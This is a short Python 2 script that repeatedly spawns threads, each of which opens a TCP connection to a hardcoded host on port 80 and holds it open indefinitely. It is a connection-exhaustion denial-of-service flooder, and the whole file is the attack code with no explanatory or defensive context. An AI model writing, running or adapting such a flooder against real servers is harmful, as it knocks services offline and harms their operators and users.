from os import *
from socket import *
from string import *
from random import *
from time import *
from thread import *

host = "192.168.31.6"
port = 80
# host = input("Host:")
# port = input("Port:")

def connect(i):
    try:
        sock1 = socket(AF_INET, SOCK_STREAM)
        sock1.connect((host, port))
        sleep(99999)
        sock1.close
    except:
        print( "Down")

n = 0
while 1:
    try:
        start_new_thread(connect, (n,))
    except:
        print ("Timeout...try restart...")
    print ("You threw it on tha Ground!")
    sleep(0.1)
